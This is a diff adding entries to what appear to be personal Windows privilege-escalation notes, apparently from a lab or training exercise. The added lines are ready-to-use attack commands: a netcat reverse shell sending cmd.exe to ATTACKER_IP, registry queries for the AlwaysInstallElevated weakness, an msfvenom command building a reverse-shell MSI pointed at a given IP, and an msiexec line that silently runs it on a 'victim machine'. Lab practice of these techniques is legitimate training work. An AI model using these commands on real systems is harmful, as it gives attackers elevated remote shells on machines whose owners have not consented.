@@ -18,3 +18,18 @@ schtasks /query /tn vulntask /fo list /v
 
 check file permissions for a file 
 icacls c:\tasks\schtask.bat
+
+setup reverse shell on windows
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 
+
+
+AlwaysInstallElevated
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+generate malicious msi file
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.106.62 LPORT=LOCAL_PORT -f msi -o malicious.msi
+
+run the created payload on the victim machine 
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
